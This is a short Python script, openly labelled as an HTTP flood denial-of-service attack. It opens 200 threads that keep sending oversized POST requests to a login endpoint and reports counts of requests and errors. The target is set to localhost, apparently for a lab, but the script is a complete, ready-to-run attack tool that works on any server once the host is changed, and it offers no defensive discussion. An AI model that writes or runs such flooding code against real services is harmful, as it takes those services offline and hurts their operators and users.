import http.client
import threading
import time
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000
TARGET_PATH = "/login"
THREADS = 200
RUNNING = True

request_count = 0
error_count = 0
lock = threading.Lock()

def flood():
    global request_count, error_count, RUNNING
    while RUNNING:
        try:
            conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=2)
            body = "username=" + "A" * 5000 + "&password=" + "B" * 5000
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            conn.request("POST", TARGET_PATH, body=body, headers=headers)
            response = conn.getresponse()
            response.read()
            conn.close()
            with lock:
                request_count += 1
        except Exception:
            with lock:
                error_count += 1

def main():
    global RUNNING
    print(f"[*] HTTP Flood DoS Attack — Target: {TARGET_HOST}:{TARGET_PORT}{TARGET_PATH}")
    print(f"[*] Launching {THREADS} concurrent threads...")
    print(f"[*] Press Ctrl+C to stop\n")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)

    print(f"[!] {THREADS} threads active")

    try:
        while True:
            time.sleep(2)
            print(f"[*] Requests sent: {request_count} | Errors/Timeouts: {error_count}")
    except KeyboardInterrupt:
        RUNNING = False
        print(f"\n[*] Stopping attack...")
        print(f"[*] Total requests sent: {request_count}")
        print(f"[*] Total errors: {error_count}")

if __name__ == "__main__":
    main()